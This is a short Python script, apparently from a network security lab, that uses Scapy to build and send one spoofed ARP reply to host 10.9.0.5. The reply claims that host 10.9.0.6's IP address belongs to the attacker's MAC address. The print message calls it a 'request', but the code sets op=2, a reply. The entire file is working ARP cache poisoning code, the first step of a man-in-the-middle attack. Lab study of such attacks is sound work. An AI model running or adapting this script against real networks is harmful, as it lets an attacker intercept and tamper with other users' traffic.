#!/usr/bin/env python3
from scapy.all import *


# Define the variables
hostM_Attacker_IP = "10.9.0.105"
hostM_Attacker_MAC = "02:42:0a:09:00:69"

hostA_IP = "10.9.0.5"
hostA_MAC = "02:42:0a:09:00:05"

hostB_IP = "10.9.0.6"
hostB_MAC = "02:42:0a:09:00:06"


print(f"SENDING SPOOFED ARP REQUEST....")


ether = Ether()
ether.dst = hostA_MAC
ether.src = hostM_Attacker_MAC

arp = ARP()
arp.psrc = hostB_IP
arp.hwsrc = hostM_Attacker_MAC
arp.pdst = hostA_IP
arp.hwdst = hostA_MAC
arp.op = 2

frame = ether/arp

sendp(frame)
